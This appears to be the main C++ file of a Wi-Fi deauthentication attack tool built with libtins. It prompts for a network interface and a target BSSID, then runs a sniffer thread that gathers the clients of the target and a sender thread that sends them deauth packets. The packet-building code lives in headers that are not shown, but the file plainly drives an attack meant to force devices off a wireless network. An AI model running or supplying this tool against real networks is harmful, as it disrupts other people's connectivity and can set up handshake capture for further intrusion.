#include <iostream>
#include <tins/tins.h>
#include <vector>
#include "data_sniffer.hpp"
#include "deauth_sender.hpp"

using namespace std;
using namespace Tins;

vector<NetworkInterface> interfaces;

void printInterfaces() {
    int i = 1;
    for (auto iface : interfaces) {
        cout << i << ". " << iface.name() << endl;
        i++;
    }
}

NetworkInterface selectInterface() {
    int index;
    cout << "input network driver number > ";
    cin >> index;
    return interfaces[index - 1];
}

string inputTarget() {
    string target;
    cout << "input target bssid > ";
    cin >> target;
    return target;
}

int main() {
    interfaces = NetworkInterface::all();
    printInterfaces();

    NetworkInterface iface = selectInterface();
    string target = inputTarget();

    DataSniffer *sniffer = new DataSniffer(iface.name(), "wlp2s0", target);
    DeauthSender *sender = new DeauthSender(sniffer->getSet(), iface.name(), target);

    thread sniffThread = thread(&DataSniffer::dataSniff, sniffer);
    thread sendThread = thread(&DeauthSender::sendPacket, sender);

    sniffThread.join();
    sendThread.join();
}